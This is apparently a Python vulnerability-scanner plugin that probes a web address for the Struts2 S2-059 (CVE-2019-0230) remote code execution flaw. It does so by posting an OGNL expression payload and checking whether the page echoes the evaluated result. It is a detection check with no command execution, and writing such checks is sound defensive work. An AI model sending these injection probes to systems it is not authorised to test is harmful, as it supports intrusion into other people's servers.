#!/usr/bin/env python3

import re
from app.lib.common import get_useragent
from app.lib.request import request

class S2_059_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'S2-059漏洞,又名CVE-2019-0230漏洞',
            'description': 'Struts2 Remote Code Execution Vulnerability, Struts 2.0.0 - Struts 2.5.20',
            'date': '2020-08-11',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        if '.action' not in self.url:
            self.url = self.url + '/index.action'
        self.headers = {
            'User-Agent': get_useragent,
            'Content-Type': "application/x-www-form-urlencoded"
        }
       
        self.payload = {
            'skillName': '%{11*11}',
            'url': '/s2_059_war_exploded/index.action'
        }
    
    async def check(self):

        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        try:
            check_req = await request.post(self.url, data = self.payload, headers = self.headers)
            check_str = re.sub('\n', '', await check_req.text())
            result = re.findall('label id="(.*?)">', check_str)
            if '121' in result[0]:
                return True
            
        except Exception as e:
            # print(e)
            pass

if  __name__ == "__main__":
    S2_059 = S2_059_BaseVerify('http://localhost:8080/s2_059_war_exploded/index.action')
    print(S2_059.check())